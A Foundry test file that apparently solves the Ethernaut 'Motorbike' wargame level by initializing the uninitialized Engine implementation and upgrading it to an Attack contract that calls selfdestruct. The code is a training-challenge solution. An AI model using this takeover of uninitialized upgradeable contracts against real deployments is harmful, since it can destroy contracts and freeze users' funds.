// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Motorbike/Motorbike.sol";

contract MotorbikeTest is StdCheats, Test {
    address eoaAddress = address(100);

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        Engine ethernautEngine = Engine(payable(address(motorbike)));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        engine.initialize();
        Attack attack = new Attack();
        engine.upgradeToAndCall(address(attack), abi.encodeWithSignature("initialize()"));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Because of the way foundry test work it is very hard to verify this test was successful
        // Selfdestruct is a substate (see pg 8 https://ethereum.github.io/yellowpaper/paper.pdf)
        // This means it gets executed at the end of a transaction, a single test is a single transaction
        // This means we can call selfdestruct on the engine contract at the start of the test but we will
        // continue to be allowed to call all other contract function for the duration of that transaction (test)
        // since the selfdestruct execution only happy at the end
    }
}

contract Attack {
    function initialize() public {
        selfdestruct(payable(address(0x0)));
    }
}
